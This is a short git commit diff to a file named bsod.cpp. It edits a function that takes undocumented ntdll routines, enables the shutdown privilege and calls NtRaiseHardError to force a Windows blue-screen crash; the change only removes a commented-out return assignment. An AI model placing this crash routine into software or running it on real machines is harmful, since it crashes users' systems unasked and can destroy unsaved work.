f3d9d594e58a648801b3864cc154d214c8b655b5
Manglemix Aurreleiata <shabouza030@gmail.com>
2023-04-13 00:50:50 -0600

    Update bsod.cpp

--- bsod.cpp
+++ bsod.cpp
@@ -18,7 +18,7 @@ void bsod()
     LPVOID lpFuncAddress2 = (LPVOID)GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
     pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
     pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
-    /*NTSTATUS NtRet = */NtCall(19, TRUE, FALSE, &bEnabled);
+    NtCall(19, TRUE, FALSE, &bEnabled);
     NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
 }
 #endif
